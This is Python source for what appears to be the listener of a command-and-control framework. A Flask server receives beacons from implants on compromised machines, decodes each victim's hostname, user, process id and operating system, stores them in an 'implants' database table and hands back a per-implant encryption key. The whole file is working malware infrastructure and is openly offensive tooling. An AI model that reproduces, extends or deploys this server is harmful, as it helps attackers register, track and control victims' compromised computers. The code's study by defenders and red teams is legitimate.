import base64
import datetime
import json
import pymysql
import random
import string
from flask import Flask
from flask import request
from flask import make_response
from gevent import wsgi
from core.config import *
from core.message import Message


class WebServer(object):

    def __init__(self, args):
        self.protocol = args.protocol
        self.external_address = args.external_address
        self.port = args.port
        self.profile = args.profile

        self.app = Flask(__name__)
        self.app.debug = True

        # reads profile as a file
        with open(self.profile) as file:
            self.json = json.load(file)

        # tries to open a database connection
        try:
            self.connection = pymysql.connect(host="localhost",
                                              port=3306,
                                              user=username,
                                              passwd=password,
                                              db=database,
                                              autocommit=True)

        except Exception:
            raise

    def start_web_server(self):
        """
        Description:
            This function starts the Flask web server
        """
        try:
            server = wsgi.WSGIServer(("0.0.0.0", self.port), self.app)
            self.app.add_url_rule(self.json["implant"]["beacon_uri"], None, self.beacon_response, methods=["GET", "POST"])
            Message.display_status("[+] Started listener")
            server.serve_forever()

        except KeyboardInterrupt:
            pass

        except Exception:
            raise

    def beacon_response(self):
        """
        escription:
            This function is called when an implant beacons
        """
        self.data = request.get_data()

        # tries to base64 decode beacon post data
        try:
            decoded = base64.b64decode(self.data).decode()

            # parses json post data
            j = json.loads(decoded)
            hostname = j["h"]
            operating_system = j["o"]
            process_id = j["p"]
            current_user = j["u"]

            # generates a random 32 character encryption key
            encryption_key = "".join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(32))

            # gets current time (uses server's time)
            now = datetime.datetime.now()
            time = now.strftime("%Y-%m-%d %H:%M:%S")

            # TO DO: INSERT an entry into the "implants" table here
            with self.connection.cursor() as cursor:
                statement = "INSERT INTO `implants` (`hostname`, `current_user`, `process_id`, `operating_system`, `last_seen`, `encryption_key`) VALUES (%s, %s, %s, %s, %s, %s)"
                cursor.execute(statement, (hostname,
                                           current_user,
                                           process_id,
                                           operating_system,
                                           time,
                                           encryption_key))

            # returns generated encryption key in the http response
            return encryption_key

        # exception means it is an rc4 beacon instead
        except Exception as e:
            print(str(e))
            return "rc4 beacon"
